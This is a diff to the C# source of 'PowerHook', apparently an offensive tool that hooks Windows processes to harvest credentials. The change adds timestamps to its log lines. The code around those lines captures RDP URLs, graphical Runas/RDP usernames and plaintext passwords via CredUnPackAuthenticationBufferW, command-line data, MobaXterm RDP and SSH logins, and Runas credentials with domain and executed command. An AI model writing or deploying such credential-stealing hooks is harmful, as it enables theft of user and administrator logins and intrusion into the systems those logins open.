@@ -378,9 +378,9 @@ namespace PowerHook
                     {
 
                         String Data = target;
-
+                        string date = DateTime.Now.ToString();
                         this._messageQueue.Enqueue(
-                        string.Format("[+] Found Potential RDP url --> {0}", Data));
+                        string.Format("[+] [{0}] Found Potential RDP url --> {1}", date, Data));
 
 
                     }
@@ -413,9 +413,9 @@ namespace PowerHook
                     {
 
                         bool success = CredUnPackAuthenticationBufferW(dwFlags, pAuthBuffer, cbAuthBuffer, pszUserName, ref pcchMaxUserName, pszDomainName, ref pcchMaxDomainame, pszPassword, ref pcchMaxPassword);
-
+                        string date = DateTime.Now.ToString();
                         this._messageQueue.Enqueue(
-                        string.Format("[+] Found Graphical Runas/RDP Login --> Username: {0}, Password: {1}", pszUserName, pszPassword)); 
+                        string.Format("[+] [{0}] Found Graphical Runas/RDP Login --> Username: {1}, Password: {2}",date, pszUserName, pszPassword)); 
                         return success;
 
                     }
@@ -448,11 +448,11 @@ namespace PowerHook
                 {
                     if (this._messageQueue.Count < 1000)
                     {
-
+                        string date = DateTime.Now.ToString();
                         String Data =  SourceString;
 
                         this._messageQueue.Enqueue(
-                        string.Format("[+] Found cmd data --> {0}", Data));
+                        string.Format("[+] [{0}] Found cmd data --> {1}", date, Data));
                         
 
                     }
@@ -486,17 +486,17 @@ namespace PowerHook
                     {
 
 
-                        
+                        string date = DateTime.Now.ToString();
                         string Data = lpsz;
                         if (Data.Contains("rdp:"))
                         {
                             this._messageQueue.Enqueue(
-                            string.Format("[+] Found MobaXterm RDP Login --> {0}", Data));
+                            string.Format("[+] [{0}] Found MobaXterm RDP Login --> {1}", date, Data));
                         }
                         if (Data.Contains(", 22 ,"))
                         {
                             this._messageQueue.Enqueue(
-                            string.Format("[+] Found MobaXterm SSH Login --> {0}", Data));
+                            string.Format("[+] [{0}] Found MobaXterm SSH Login --> {1}", date, Data));
                         }
 
                     }
@@ -560,7 +560,7 @@ namespace PowerHook
                     {
 
 
-                       
+                        string date = DateTime.Now.ToString();
                         var Domain = domain;
                         var username = userName;
                         var Password = password;
@@ -568,7 +568,7 @@ namespace PowerHook
 
 
                         this._messageQueue.Enqueue(
-                            string.Format("[+] Found Runas Creds --> Username: {0}, Password: {1}, Domain: {2}, Executed: {3}", username, Password, Domain, CommandLine));
+                            string.Format("[+] [{0}] Found Runas Creds --> Username: {1}, Password: {2}, Domain: {3}, Executed: {4}", date, username, Password, Domain, CommandLine));
                         
                     }
                 }
